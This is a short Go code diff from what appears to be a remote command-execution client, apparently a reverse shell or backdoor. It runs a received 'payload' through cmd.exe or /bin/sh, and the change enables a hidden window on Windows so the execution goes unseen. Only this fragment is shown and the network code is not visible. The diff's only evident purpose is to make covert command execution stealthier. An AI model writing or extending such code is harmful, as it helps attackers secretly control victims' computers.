@@ -5,6 +5,7 @@ import (
 	"net"
 	"os/exec"
 	"runtime"
+	"syscall"
 	"time"
 )
 
@@ -35,7 +36,7 @@ func main() {
 				switch runtime.GOOS {
 				case "windows":
 					cmd = exec.Command("cmd.exe", "/C", payload)
-					// cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 				default:
 					cmd = exec.Command("/bin/sh", "-c", payload)
 				}
